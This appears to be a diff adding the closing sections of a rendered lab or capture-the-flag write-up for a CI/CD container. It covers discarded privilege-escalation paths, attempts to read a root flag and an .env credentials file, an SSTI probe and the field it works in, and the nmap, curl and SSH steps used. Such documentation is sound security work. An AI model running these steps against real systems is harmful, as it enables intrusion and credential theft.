+<li><strong><code>sudo</code> NOPASSWD escalation</strong> (the lab-2 pattern): <strong>checked and absent.</strong> <code>/etc/sudoers</code> contains only the stock <code>root</code>, <code>%admin</code>, <code>%sudo</code> lines; <code>/etc/sudoers.d/</code> holds only the packaged <code>README</code> (<code>-r--r----- root root</code>). Neither <code>ciapp</code> nor <code>devops</code> is in <code>sudo</code>/<code>admin</code>. Had this rule existed it would have been reported even unused — it simply is not there.</li>
+<li><strong>Direct <code>devops</code> → root via file permissions:</strong> attempted and <strong>refused by the OS</strong> — <code>cat: /root/root_flag.txt: Permission denied</code>. Recorded as a control, not a dead end.</li>
+<li><strong>Reading <code>/opt/ci/.env</code> as <code>devops</code>:</strong> not viable, <code>0640 ciapp:ciapp</code>. This is <em>why</em> the chain needs the web RCE first; had the mode been <code>0644</code> the whole SSTI leg would have been optional.</li>
+<li><strong>SSTI via the <code>ref</code> parameter:</strong> tested and <strong>discarded</strong> — <code>ref</code> is passed as a template context variable, so <code>{{7*7}}</code> stays literal (see the control in §2). Only <code>name</code> reaches the template-source sink. This is a genuine second control, and it is why the payload had to be placed in the right field.</li>
+<li><strong>Reading <code>app.py</code> from <code>devops</code> to find <code>.env</code>:</strong> not viable, mode <code>0600 ciapp:ciapp</code>. The source was only available to me because I control the container; a real attacker gets it over SSTI or not at all.</li>
+<li><strong>Named-pipe / <code>\\.\pipe\</code> interpretation of the lab name:</strong> discarded in §0. The name refers to CI/CD pipelines.</li>
+</ul>
+<hr />
+<h2 id="10-version-and-provenance">10. Version and provenance</h2>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Container</td>
+<td><code>701a4e739ad0</code>, image <code>pipepwned:latest</code>, <code>linux/amd64</code></td>
+</tr>
+<tr>
+<td>Base</td>
+<td>Ubuntu 22.04.5 LTS</td>
+</tr>
+<tr>
+<td>OpenSSH</td>
+<td>8.9p1 Ubuntu 3ubuntu0.16</td>
+</tr>
+<tr>
+<td>Python / Flask / Gunicorn</td>
+<td>3 (with <code>cap_net_bind_service=+ep</code>) / 3.1.3 / 26.0.0</td>
+</tr>
+<tr>
+<td>Deployment</td>
+<td><code>docker load</code> + <code>docker run -d</code> (the packaged <code>auto_deploy.sh</code> was <strong>not</strong> executed — it ends in a <code>while true</code> loop with no exit condition)</td>
+</tr>
+<tr>
+<td>Access</td>
+<td>container IP <code>[net-0-4]</code>, no published ports (the packaged deploy script publishes none either)</td>
+</tr>
+<tr>
+<td>Source read</td>
+<td><code>/opt/app/app.py</code> in full, plus <code>runner.sh</code>, <code>config.toml</code>, <code>.env</code>, image build history, <code>start.sh</code></td>
+</tr>
+<tr>
+<td>Commands run against the target</td>
+<td><code>nmap -sV -Pn -p-</code>; 5 <code>curl</code> requests; 1 <code>paramiko</code> SSH session executing 6 commands; 3 job scripts dropped in <code>/opt/ci/builds</code></td>
+</tr>
+</tbody>
+</table>
+<p>All output quoted in this document is literal, captured from the live run. No value is reconstructed from memory and no step is described that was not executed.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
